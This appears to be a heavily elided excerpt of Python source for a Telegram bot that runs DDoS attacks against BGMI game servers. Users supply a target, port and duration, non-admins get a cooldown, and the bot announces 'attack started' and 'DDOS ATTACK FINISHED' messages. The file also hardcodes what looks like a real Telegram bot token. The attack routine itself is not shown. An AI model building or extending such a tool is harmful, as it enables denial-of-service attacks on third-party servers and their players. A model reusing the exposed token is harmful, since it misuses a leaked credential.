...
bot = telebot.TeleBot('7384161828:AAFCnUmmlvvzfUWr_eKXN82H4q8yIOyrMrI')
...
def start_attack_reply(message, target, port, time):
    ...
    response = f"𝙔𝙊𝙐𝙍 𝘼𝙏𝙏𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔 ✅ "
    bot.reply_to(message, response)
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 100:
                response = "𝙔𝙊𝙐 𝘼𝙍𝙀 𝙊𝙉 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉 𝙒𝘼𝙄𝙏 100 𝙎𝙀𝘾𝙊𝙉𝘿𝙎 ⏳"
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 500:
                ...
                response = f"𝘽𝙂𝙈𝙄 𝘿𝘿𝙊𝙎 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 ✅"
        else:
...
def welcome_start(message):
    ...
    response = f"WELCOME TO OUR BOT HOPE YOU SATISFIED by @jatt_agya"
    bot.reply_to(message, response)
